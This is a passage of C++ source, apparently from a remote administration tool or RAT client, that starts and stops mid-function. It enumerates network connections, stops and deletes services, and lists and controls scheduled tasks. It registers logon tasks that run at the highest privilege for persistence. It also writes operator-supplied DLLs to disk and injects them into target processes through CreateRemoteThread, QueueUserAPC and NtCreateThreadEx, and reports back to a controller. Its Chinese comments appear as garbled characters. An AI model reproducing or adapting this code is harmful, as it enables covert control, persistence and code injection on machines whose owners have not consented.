				lstrcpy(strState, _T("���ڹر�"));
				break;
			case MIB_TCP_STATE_LAST_ACK:
				lstrcpy(strState, _T("LAST_ACK"));
				break;
			case MIB_TCP_STATE_TIME_WAIT:
				lstrcpy(strState, _T("TIME_WAIT"));
				break;
			case MIB_TCP_STATE_DELETE_TCB:
				lstrcpy(strState, _T("ɾ��"));
				break;
			default:
				break;
			}
			// ����IP��ַ
			inadLocal.s_addr = pTcpTable_Vista->table[i].dwLocalAddr;

			// Զ�̶˿�
			if (lstrcmp(strState, _T("����")) != 0)
			{
				dwRemotePort = pTcpTable_Vista->table[i].dwRemotePort;
			}
			else
				dwRemotePort = 0;

			// Զ��IP��ַ
			inadRemote.s_addr = pTcpTable_Vista->table[i].dwRemoteAddr;

			temp = char2wchar_t(inet_ntoa(inadLocal));
			wsprintf(szLocalAddr, _T("%s:%u"), temp,
				ntohs((unsigned short)(0x0000FFFF & pTcpTable_Vista->table[i].dwLocalPort)));
			SAFE_DELETE_AR(temp);
			temp = char2wchar_t(inet_ntoa(inadRemote));
			wsprintf(szRemoteAddr, _T("%s:%u"), temp,
				ntohs((unsigned short)(0x0000FFFF & dwRemotePort)));
			SAFE_DELETE_AR(temp);


			// ��ӡ������ڵ���Ϣ
			TCHAR strProcessName[100] = { 0 };
			TCHAR* strType = _T("[TCP]");
			lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pTcpTable_Vista->table[i].dwProcessId, szProcessName));

			dwLength = lstrlen(strProcessName) * sizeof(TCHAR) + sizeof(DWORD) + lstrlen(strType) * sizeof(TCHAR) + lstrlen(szLocalAddr) * sizeof(TCHAR) + lstrlen(szRemoteAddr) * sizeof(TCHAR) + lstrlen(strState) * sizeof(TCHAR) + 12;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strProcessName) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, &pTcpTable_Vista->table[i].dwProcessId, sizeof(DWORD) + 2);
			dwOffset += sizeof(DWORD) + 2;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strType) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szLocalAddr) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2;

			memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) * sizeof(TCHAR) + 2);
			dwOffset += lstrlen(strState) * sizeof(TCHAR) + 2;
		}

		PMIB_UDPEXTABLE pUdpExTable = NULL;
		// ����Ϊ Vista ���� 7 ����ϵͳ
		PFNInternalGetUdpTableWithOwnerPid pInternalGetUdpTableWithOwnerPid;
		pInternalGetUdpTableWithOwnerPid =
			(PFNInternalGetUdpTableWithOwnerPid)GetProcAddress(hModule, "InternalGetUdpTableWithOwnerPid");
		if (pInternalGetUdpTableWithOwnerPid != NULL)
		{
			if (pInternalGetUdpTableWithOwnerPid(&pUdpExTable, GetProcessHeap(), 1))
			{
				if (pUdpExTable)
				{
					HeapFree(GetProcessHeap(), 0, pUdpExTable);
				}

				FreeLibrary(hModule);
				hModule = NULL;

				return 0;
			}

			// ��ӡUDP��������Ϣ
			for (DWORD i = 0; i < pUdpExTable->dwNumEntries; ++i)
			{
				// ����IP��ַ
				inadLocal.s_addr = pUdpExTable->table[i].dwLocalAddr;
				temp = char2wchar_t(inet_ntoa(inadLocal));
				wsprintf(szLocalAddr, _T("%s:%u"), temp,
					ntohs((unsigned short)(0x0000FFFF & pUdpExTable->table[i].dwLocalPort)));
				SAFE_DELETE_AR(temp);

				// ��ӡ������ڵ���Ϣ
				TCHAR strProcessName[100] = { 0 };
				TCHAR* strType = _T("[UDP]");
				TCHAR* szRemoteAddr = _T("*.*.*.*:*");
				TCHAR* szUDPState = _T(" ");
				lstrcpy(strProcessName, ProcessPidToName(hProcessSnap, pUdpExTable->table[i].dwProcessId, szProcessName));

				dwLength = lstrlen(strProcessName) * sizeof(TCHAR) + sizeof(DWORD) + lstrlen(strType) * sizeof(TCHAR) + lstrlen(szLocalAddr) * sizeof(TCHAR) + lstrlen(szRemoteAddr) * sizeof(TCHAR) + lstrlen(szUDPState) * sizeof(TCHAR) + 12;
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(strProcessName) * sizeof(TCHAR) + 2;

				memcpy(lpBuffer + dwOffset, &pUdpExTable->table[i].dwProcessId, sizeof(DWORD) + 2);
				dwOffset += sizeof(DWORD) + 2;

				memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(strType) * sizeof(TCHAR) + 2;

				memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(szLocalAddr) * sizeof(TCHAR) + 2;

				memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(szRemoteAddr) * sizeof(TCHAR) + 2;

				memcpy(lpBuffer + dwOffset, szUDPState, lstrlen(szUDPState) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(szUDPState) * sizeof(TCHAR) + 2;
			}
		}
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}

// ������ID�ţ�PID��ת��Ϊ��������
TCHAR* CMachineManager::ProcessPidToName(HANDLE hProcessSnap, DWORD ProcessId, TCHAR* ProcessName)
{
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(processEntry);
	// �Ҳ����Ļ���Ĭ�Ͻ�����Ϊ��???��
	lstrcpy(ProcessName, _T("???"));
	if (!::Process32First(hProcessSnap, &processEntry))
		return ProcessName;
	do
	{
		if (processEntry.th32ProcessID == ProcessId) // �����������
		{
			lstrcpy(ProcessName, processEntry.szExeFile);
			break;
		}
	} while (::Process32Next(hProcessSnap, &processEntry));
	return ProcessName;
}


wchar_t* CMachineManager::char2wchar_t(char* cstr) {

	int len = MultiByteToWideChar(CP_ACP, 0, cstr, -1, NULL, 0);
	wchar_t* wstr = new wchar_t[len];
	memset(wstr, 0, len * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, cstr, -1, wstr, len);
	return wstr;
}




BOOL CMachineManager::EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}



void CMachineManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //ɾ������
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

	TCHAR temp[500];
	TCHAR* ServerName = NULL;
	lstrcpy(temp, (TCHAR*)(lpBuffer));
	ServerName = temp;
	DWORD _err = 0;
	service = OpenService(scm, ServerName, SERVICE_ALL_ACCESS);

	_err = GetLastError();
	BOOL isSuccess = QueryServiceStatus(service, &status);

	if (status.dwCurrentState != SERVICE_STOPPED)
	{
		isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
	}
	isSuccess = ::DeleteService(service);
	CloseServiceHandle(service);
	CloseServiceHandle(scm);

	// ����Sleep�£���ֹ����
	Sleep(100);
	SendServicesList(dwServiceType);
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}

void CMachineManager::MyControlService(LPBYTE lpBuffer, UINT nType)  //���� ֹͣ����
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);  // �򿪷���������

	service = OpenService(scm, (TCHAR*)lpBuffer, SERVICE_ALL_ACCESS);  // ��www����

	BOOL isSuccess = QueryServiceStatus(service, &status);


	switch (nType)
	{
	case 0:
		if (status.dwCurrentState == SERVICE_STOPPED)  //����ֹͣ״̬ ����������
		{
			isSuccess = StartService(service, NULL, NULL);
		}
		break;
	case 1:
		if (status.dwCurrentState != SERVICE_STOPPED)
		{
			isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		}
		break;
	case 2:
		if (status.dwCurrentState == SERVICE_RUNNING)
		{
			isSuccess = ControlService(service, SERVICE_CONTROL_PAUSE, &status);
		}
		break;
	case 3:
		if (status.dwCurrentState == SERVICE_PAUSED)
		{
			isSuccess = ControlService(service, SERVICE_CONTROL_CONTINUE, &status);
		}
		break;
	}

	CloseServiceHandle(service);
	CloseServiceHandle(scm);

	// ����Sleep�£���ֹ����
	Sleep(100);
	SendServicesList(dwServiceType);
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}



PBYTE CMachineManager::GetTaskAll(ITaskFolder* pFolder)
{
	IRegisteredTaskCollection* pTaskCollection = NULL;   //�������񼯺�
	LONG numTasks = 0;                                                  //�������

	//��ȡ��������
	HRESULT hr = pFolder->GetTasks(TASK_ENUM_HIDDEN, &pTaskCollection);
	pFolder->Release();

	if (FAILED(hr))
	{
		return NULL;
	}

	//��ȡ�������
	hr = pTaskCollection->get_Count(&numTasks);
	if (numTasks == 0)
	{
		pTaskCollection->Release();
		return NULL;
	}


	//��ʼ��������
	for (LONG i = 0; i < numTasks; i++)
	{
		IRegisteredTask* pRegisteredTask = NULL;
		hr = pTaskCollection->get_Item(_variant_t(i + 1), &pRegisteredTask);            //�±��Ǵ�1��ʼ��
		if (SUCCEEDED(hr))
		{
			ITaskDefinition* pDefinition = NULL;
			BSTR taskName = NULL;
			BSTR path = NULL;
			BSTR exepath = NULL;
			DATE LastTime = 0;
			DATE NextTime = 0;
			TCHAR* status = NULL;
			TASK_STATE taskState = TASK_STATE_UNKNOWN;

			pRegisteredTask->get_Name(&taskName);
			pRegisteredTask->get_Path(&path);
			pRegisteredTask->get_LastRunTime(&LastTime);
			pRegisteredTask->get_NextRunTime(&NextTime);
			pRegisteredTask->get_State(&taskState);

			pRegisteredTask->get_Definition(&pDefinition);
			if (pDefinition)
			{
				GetProgramPath(pDefinition, &exepath);
			}

			switch (taskState)
			{
			case TASK_STATE_UNKNOWN:
				status = _T("δ֪״̬");
				break;
			case TASK_STATE_DISABLED:
				status = _T("�ѽ���");
				break;
			case TASK_STATE_QUEUED:
				status = _T("�Ŷ���");
				break;
			case TASK_STATE_READY:
				status = _T("��׼��");
				break;
			case TASK_STATE_RUNNING:
				status = _T("������");
				break;
			default:
				break;
			}
			//�������ݵ�buff��
			SaveData(taskName, path, exepath, status, LastTime, NextTime);

			if (path)
				SysFreeString(path);
			if (taskName)
				SysFreeString(taskName);
			if (exepath)
				SysFreeString(exepath);
			if (pRegisteredTask)
				pRegisteredTask->Release();
		}
	}
	pTaskCollection->Release();
	return NULL;
}

PBYTE CMachineManager::GetFolderAll(ITaskFolder* pFolder)
{
	ITaskFolderCollection* pFolders = NULL;         //���ļ��м���
	LONG Count = 0;                                             //���ļ��и���

	HRESULT hr = pFolder->GetFolders(0, &pFolders);
	if (FAILED(hr))
	{
		return 0;
	}

	//��ȡ�ļ��и���
	hr = pFolders->get_Count(&Count);
	if (FAILED(hr))
	{
		return 0;
	}

	if (Count == 0)
	{
		pFolders->Release();
		//��ȡ�ļ����µ�����
		GetTaskAll(pFolder);
	}
	else
	{
		//�ȱ���Ŀ¼�µ�����
		GetTaskAll(pFolder);

		//�ݹ�����ļ���
		for (int i = 0; i < Count; i++)
		{
			ITaskFolder* ispFolder = NULL;
			hr = pFolders->get_Item(variant_t(i + 1), &ispFolder);
			if (FAILED(hr))
			{
				continue;
			}
			GetFolderAll(ispFolder);
		}

		pFolders->Release();
	}

	return 0;
}

PBYTE CMachineManager::GetRoot()
{
	static bool binit = false;
	lpList = NULL;
	offset = 0;
	nBufferSize = 0;

	if (!binit)
	{
		//��ʼ��com��
		HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if (FAILED(hr))
		{
			binit = false;	
		}
		else
		{
			// ���ð�ȫ�ȼ�
			hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

			if (FAILED(hr) && RPC_E_TOO_LATE != hr)
			{
				binit = false;
			}
			else
			{
				//ʵ�����ƻ�����
				hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);

				if (!pService) 
					return 0;


				if (FAILED(hr))
				{
					binit = false;
				}
				else
				{
					//  ���Ӽƻ�����
					hr = pService->Connect(_variant_t(), _variant_t(),_variant_t(), _variant_t());
					if (FAILED(hr))
						binit = false;
					else
						binit = true;
				}	
			}
		
		}
	
	}

	if (!binit)
	{
		BYTE bToken = TOKEN_MACHINE_TASKLIST;
		Send( &bToken, 1);
		return 0;
	}


	ITaskFolder* pRootFolder = NULL;
	if (!pService)
		return 0;
	HRESULT hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
		return 0;
	}
	//�ȷ�10kb ��С
	nBufferSize = 1024 * 10; // �ȷ���10K�Ļ�����
	lpList = (BYTE*)LocalAlloc(LPTR, nBufferSize);

	if (lpList)
	{

		lpList[0] = TOKEN_MACHINE_TASKLIST;
		offset++;
		GetFolderAll(pRootFolder);
		Send((LPBYTE)lpList, (UINT)LocalSize(lpList));
		LocalFree(lpList);
		lpList = NULL;
		offset = 0;
	}
	else
	{
		pRootFolder->Release();
	}


	return 0;

}


//����
BOOL CMachineManager::CreateTask(LPBYTE lpBuffer)
{
	TCHAR* rootpath = (TCHAR*)lpBuffer;
	TCHAR* taskname = rootpath + lstrlen(rootpath) + 1;
	TCHAR* path = taskname + lstrlen(taskname) + 1;
	TCHAR* Author = path + lstrlen(path) + 1;
	TCHAR* Description = Author + lstrlen(Author) + 1;

	BOOL ret = FALSE;
	ITaskFolder* pRootFolder = NULL;
	ITaskDefinition* pDefinition = NULL;
	IRegistrationInfo* pRegistrationInfo = NULL;
	IPrincipal* pPrincipal = NULL;
	ITaskSettings* pSettings = NULL;
	ITriggerCollection* pTriggers = NULL;
	IActionCollection* pActions = NULL;
	IExecAction* pExecAction = NULL;
	IRegisteredTask* pRegisteredTask = NULL;

	//ѡ��ƻ�����ע�����ĸ��ļ�����
	HRESULT hr = pService->GetFolder(rootpath, &pRootFolder);
	if (SUCCEEDED(hr))
	{
		//�������������
		hr = pService->NewTask(0, &pDefinition);
		if (SUCCEEDED(hr))
		{
			//��ȡע����Ϣ��ʵ��������дע����Ϣ
			hr = pDefinition->get_RegistrationInfo(&pRegistrationInfo);
			//��ȡ����������Ϣ��ʵ��
			HRESULT hr2 = pDefinition->get_Principal(&pPrincipal);
			//�������������Ϣ
			HRESULT hr3 = pDefinition->get_Settings(&pSettings);
			//���ô�����
			HRESULT hr4 = pDefinition->get_Triggers(&pTriggers);
			//����ִ�в���
			HRESULT hr5 = pDefinition->get_Actions(&pActions);

			if (SUCCEEDED(hr) && SUCCEEDED(hr2) && SUCCEEDED(hr3) && SUCCEEDED(hr4) && SUCCEEDED(hr5))
			{
				//����
				pRegistrationInfo->put_Author(Author);
				//����
				pRegistrationInfo->put_Description(Description);
				pRegistrationInfo->Release();

				//  ���õ�½���� (�û������Ѿ���¼�� �����񽫽������еĽ���ʽ�Ự�����С� )
				pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
				// ��������Ȩ�� (���������Ȩ�����С� )
				pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
				//���ñ��������Զ��ӳ�10��������
				pSettings->put_StartWhenAvailable(VARIANT_TRUE);
				//����������
				ITrigger* pTrigger;
				hr = pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);

				IAction* pAction;
				//����ִ��
				pActions->Create(TASK_ACTION_EXEC, &pAction);
				pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
				//���ó���·������Ϣ
				pExecAction->put_Path(path);
				//ע��
				hr = pRootFolder->RegisterTaskDefinition(taskname, pDefinition, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);
				if (SUCCEEDED(hr))
				{
					ret = TRUE;

					pRegisteredTask->Release();

				}

				if (pAction)
					pAction->Release();

				if (pTrigger)
					pTrigger->Release();
			}
			if (pPrincipal)
				pPrincipal->Release();

			if (pSettings)
				pSettings->Release();

			if (pTriggers)
				pTriggers->Release();

			if (pActions)
				pActions->Release();
			pDefinition->Release();

		}
		pRootFolder->Release();
	}

	if (ret)
	{
		GetRoot();
	}
	return ret;
}
//ִ�� �� ֹͣ
BOOL CMachineManager::RunOrStopTask(LPBYTE lpBuffer, BOOL Action)
{
	TCHAR* rootpath = (TCHAR*)lpBuffer;
	TCHAR* taskname = rootpath + lstrlen(rootpath) + 1;


	BOOL ret = FALSE;
	ITaskFolder* pRootFolder = NULL;
	IRegisteredTask* ppTask = NULL;
	VARIANT params = { 0 };
	//ѡ��ƻ�����ע�����ĸ��ļ�����
	HRESULT hr = pService->GetFolder(rootpath, &pRootFolder);
	if (SUCCEEDED(hr))
	{
		hr = pRootFolder->GetTask(taskname, &ppTask);
		if (SUCCEEDED(hr))
		{
			if (Action)  //ִ��
			{
				hr = ppTask->Run(params, NULL);
				if (SUCCEEDED(hr))
				{
					ret = TRUE;

				}
			}
			else  //ֹͣ
			{
				hr = ppTask->Stop(0);
				if (SUCCEEDED(hr))
				{
					ret = TRUE;
				}
			}
			ppTask->Release();
		}
		pRootFolder->Release();
	}

	if (ret)
	{
		GetRoot();
	}
	return ret;
}

//ɾ��
BOOL CMachineManager::DelTask(LPBYTE lpBuffer)
{


	TCHAR* rootpath = (TCHAR*)lpBuffer;
	TCHAR* taskname = rootpath + lstrlen(rootpath) + 1;

	BOOL ret = FALSE;
	ITaskFolder* pRootFolder = NULL;
	//ѡ��ƻ�����ע�����ĸ��ļ�����
	HRESULT hr = pService->GetFolder(rootpath, &pRootFolder);
	if (SUCCEEDED(hr))
	{
		hr = pRootFolder->DeleteTask(taskname, 0);
		if (SUCCEEDED(hr))
		{
			ret = TRUE;
		}
		pRootFolder->Release();
	}

	if (ret)
	{
		GetRoot();
	}
	return ret;
}


void CMachineManager::SaveData(BSTR taskname, BSTR path, BSTR exepath, TCHAR* status, DATE LastTime, DATE NextTime)
{
	DWORD nameLEN = 0;
	DWORD taskpathLEN = 0;
	DWORD statusLEN = 0;
	DWORD exeLEN = 0;
	DWORD sum = 0;
	/*char name[MAX_PATH] = { 0 };
	char taskpath[MAX_PATH] = { 0 };
	char exe[MAX_PATH] = { 0 };
	if (taskname)
		WideCharToMultiByte(CP_ACP, 0, taskname, -1, name, MAX_PATH, 0, 0);
	if (path)
		WideCharToMultiByte(CP_ACP, 0, path, -1, taskpath, MAX_PATH, 0, 0);
	if (exepath)
		WideCharToMultiByte(CP_ACP, 0, exepath, -1, exe, MAX_PATH, 0, 0);*/

	if (exepath == NULL)
	{
		TCHAR str[] = _T("");
		exepath = str;
	}
	nameLEN = lstrlen(taskname) * 2 + 2;
	taskpathLEN = lstrlen(path) * 2 + 2;
	statusLEN = lstrlen(status) * 2 + 2;
	exeLEN = lstrlen(exepath) * 2 + 2;



	sum = nameLEN + taskpathLEN + statusLEN + exeLEN + sizeof(DATE) * 2;
	// ��̬��չ������
	if (nBufferSize < (offset + sum))
	{
		nBufferSize = nBufferSize + 1024 * 4;
		lpList = (BYTE*)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
		if (!lpList)
		{
			return;
		}
	}

	//��������
	memcpy(lpList + offset, taskname, nameLEN);
	offset += nameLEN;

	memcpy(lpList + offset, path, taskpathLEN);
	offset += taskpathLEN;

	memcpy(lpList + offset, exepath, exeLEN);
	offset += exeLEN;

	memcpy(lpList + offset, status, statusLEN);
	offset += statusLEN;

	memcpy(lpList + offset, &LastTime, sizeof(DATE));
	offset += sizeof(DATE);

	memcpy(lpList + offset, &NextTime, sizeof(DATE));
	offset += sizeof(DATE);
}


BOOL CMachineManager::GetProgramPath(ITaskDefinition* iDefinition, BSTR* exepath)
{
	IActionCollection* pIAction = NULL;
	IAction* pAction = NULL;
	IExecAction* pExecAction = NULL;
	HRESULT hr = iDefinition->get_Actions(&pIAction);
	if (FAILED(hr))
	{
		goto out;
	}

	hr = pIAction->get_Item(1, &pAction);
	if (FAILED(hr))
	{
		goto out;
	}

	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	if (FAILED(hr))
	{
		goto out;
	}

	pExecAction->get_Path(exepath);

out:
	if (pIAction)
		pIAction->Release();
	if (pAction)
		pAction->Release();
	if (pExecAction)
		pExecAction->Release();

	iDefinition->Release();
	return 1;
}

void CMachineManager::SendError(TCHAR* Terror)
{
	int nlen = lstrlen(Terror) * sizeof(TCHAR) + 4;
	BYTE* pbuffer = new BYTE[nlen];
	ZeroMemory(pbuffer, nlen);
	pbuffer[0] = TOKEN_MACHINE_MSG;
	memcpy(pbuffer + 1, Terror, nlen - 4);
	Send(pbuffer, nlen);
	SAFE_DELETE_AR(pbuffer);
}

HANDLE WINAPI ThreadProc(PTHREAD_DATA data)
{

	data->fnRtlInitUnicodeString(&data->UnicodeString, data->DllName);
	data->fnLdrLoadDll(data->DllPath, data->Flags, &data->UnicodeString, &data->ModuleHandle);
	return data->ModuleHandle;
}

DWORD WINAPI ThreadProcEnd()
{
	return 0;
}


void CMachineManager::injectprocess(DWORD mode, DWORD ExeIsx86, DWORD dwProcessID, byte* data, DWORD datasize, TCHAR* path)
{
	switch (mode)
	{
	case 0: //Զ�̷߳���ע��(��ط���ע��)
	case 1:
	case 2:
	{
		DeleteFile(path);
		if (GetFileAttributes(path) != -1)  //����ļ�������  �˳�
		{
			SendError(_T("�ļ��Ѿ������޷�д�������ļ�����"));
			return;
		}
		//д���ļ�
			HANDLE VmFile = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
		if (VmFile == INVALID_HANDLE_VALUE)
		{
			SendError(_T("�������·���ļ�ʧ��"));
			return;
		}
		DWORD dwTemp;
		WriteFile(VmFile, data, datasize, &dwTemp, NULL);
		CloseHandle(VmFile);
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
		if (hProc == NULL)
		{
			SendError(_T("�򿪽���ʧ��"));
			return;
		}
		switch (mode)
		{
		case 0: //CreateRemoteThread(��ط���ע��)
		{
			yapi::YAPICall LoadLibraryA(hProc, _T("kernel32.dll"), "LoadLibraryW");
			if (ExeIsx86)
			{
				DWORD64 x86Dll = LoadLibraryA(path);
				SendError(_T("ע��32λdll�ɹ�"));
			}
			else
			{
				DWORD64 x64Dll = LoadLibraryA.Dw64()(path);
				SendError(_T("ע��64λdll�ɹ�"));
			}
		}
		break;
		case 1: //QueueUserAPC(��ط���ע��)
		{
			FARPROC fpAddresses[5] = {
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAllocateVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtWriteVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtSuspendThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAlertResumeThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueueApcThread")
			};

			pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[0];
			pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[1];
			pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[2];
			pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[3];
			pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[4];

			HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
			THREADENTRY32 te32;
			hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
			if (hThreadSnap == INVALID_HANDLE_VALUE) {
				SendError(_T("�޷���ȡ�߳̿���"));
				break;
			}
			te32.dwSize = sizeof(THREADENTRY32);
			DWORD threadId;
			if (!Thread32First(hThreadSnap, &te32)) {
				SendError(_T("�޷���õ�һ���߳�"));
				break;
			}
			do {
				if (te32.th32OwnerProcessID ==dwProcessID) {
					threadId = te32.th32ThreadID;
					HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
					if (hThread) {
						LPVOID pDllPath = VirtualAllocEx(hProc, 0, lstrlen(path) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
						WriteProcessMemory(hProc, pDllPath, LPVOID(path), lstrlen(path) * sizeof(TCHAR), NULL);

						if (fNtSuspendThread)
						{
							ULONG SuspendCount = 0;
							fNtSuspendThread(hThread, &SuspendCount);
						}
						LPVOID LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
						DWORD dwResult = fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)LoadLibAddr, pDllPath, NULL, NULL);
						if (fNtAlertResumeThread)
						{
							ULONG SuspendCount = 0;
							fNtAlertResumeThread(hThread, &SuspendCount);
						}
						if (dwResult) {
							SendError(_T("��Ч�غ����߳��гɹ�ע��"));
							break;;
						}
						else
						{
							SendError(_T("���ô���QueueUSerAPC().�������������߳�"));
							continue;
						}
					}
					else {
						SendError(_T("��ȡ�ҵ����߳� ID ʱ����"));
						break;;
					}
				}
			} while (Thread32Next(hThreadSnap, &te32));

			if (!threadId)
				SendError(_T("û���߳����ڽ���"));
			CloseHandle(hThreadSnap);
			return;

		}
		break;
		case 2: //NtCreateThreadEx(��ط���ע��)
		{
			HANDLE      hThread = NULL;
			LPVOID pThreadData = NULL;
			THREAD_DATA  data;
			LPVOID  pCode = NULL;
			HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
			if (hNtdll == NULL)
			{
				SendError(_T("ntdll.dll error"));
				break;
			}
			data.fnRtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
			data.fnLdrLoadDll = (pLdrLoadDll)GetProcAddress(hNtdll, "LdrLoadDll");
			memcpy(data.DllName, path, (lstrlen(path) + 1) * sizeof(WCHAR));
			data.DllPath = NULL;
			data.Flags = 0;
			data.ModuleHandle = INVALID_HANDLE_VALUE;
			pThreadData = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (pThreadData == NULL)
			{
				SendError(_T("VirtualAllocEx error"));
				break;
			}
			if (!WriteProcessMemory(hProc, pThreadData, &data, sizeof(data), NULL))
			{
				SendError(_T("WriteProcessMemory  error"));
				VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
				break;
			}
			/*	DWORD endsize = (DWORD)ThreadProcEnd;
				DWORD Procsize = (DWORD)ThreadProc;
				DWORD sizeOfCode = Procsize - endsize;*/
			DWORD sizeOfCode = (DWORD)ThreadProcEnd - (DWORD)ThreadProc;
			pCode = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (pCode == NULL)
			{
				SendError(_T("VirtualAllocEx2 error"));
				VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
				break;
			}
			if (!WriteProcessMemory(hProc, pCode, (PVOID)ThreadProc, 4096, NULL))
			{
				SendError(_T("WriteProcessMemory2 error"));
				VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
				VirtualFreeEx(hProc, pCode, 0, MEM_RELEASE);
				break;
			}
			FARPROC     pFunc = NULL;
			pFunc = GetProcAddress(hNtdll, "NtCreateThreadEx");
			if (pFunc == NULL)
			{
				SendError(_T("NtCreateThreadEx error"));
				VirtualFreeEx(hProc, pThreadData, 0, MEM_RELEASE);
				VirtualFreeEx(hProc, pCode, 0, MEM_RELEASE);
				break;
			}
	
